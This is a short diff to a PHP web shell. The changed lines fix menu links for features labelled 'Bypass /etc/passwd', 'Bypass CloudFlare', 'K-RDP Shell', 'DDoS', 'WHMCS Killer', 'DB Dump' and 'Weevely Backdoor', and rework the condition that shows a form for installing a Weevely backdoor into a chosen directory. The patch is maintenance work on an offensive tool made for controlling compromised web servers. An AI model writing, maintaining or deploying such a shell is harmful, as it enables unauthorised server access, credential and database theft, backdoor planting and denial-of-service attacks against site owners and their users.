@@ -698,7 +698,7 @@ ___  ___         ______                 _              _
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&bypass=vhosts'>Bypass Vhost</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&bypass=etcpass'>Bypass /etc/passwd</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&bypass=cloudfl'>Bypass CloudFlare</a>";
-  echo "<a style='border:1px groove cyan;' href='?weevely'>Weevely</a>";
+  echo "<a style='border:1px groove cyan;' href='?dir=$dir&weevely=install'>Weevely</a>";
   echo " <p>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=ddos'>DDoS</a>";
@@ -714,7 +714,7 @@ ___  ___         ______                 _              _
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=zip_menu'>Zip Menu</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=infosec'>Server Info</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=phpinfo'>PHP Info</a>";
-  echo "<a style='border:1px groove cyan;' href='?whmcs=killer'>WHMCS Killer</a>";
+  echo "<a style='border:1px groove cyan;' href='?dir=$dir&whmcs=killer'>WHMCS Killer</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=whmcsdeco'>WHMCS Decoder</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=dbdump'>DB Dump</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=vb_ngindex'>VB Index Changer</a>";
@@ -845,7 +845,7 @@ ___  ___         ______                 _              _
     $error = "<center><font color='red'>$mesg</font></center>";
     echo "$error";
   }
-  if (isset($_GET['weevely'])) {
+  elseif ($_GET['weevely'] == 'install') {
     echo "<center><h3>Weevely Backdoor</h3>
     <form action='' method='post'>
     Directory to install weevely backdoor:<br>
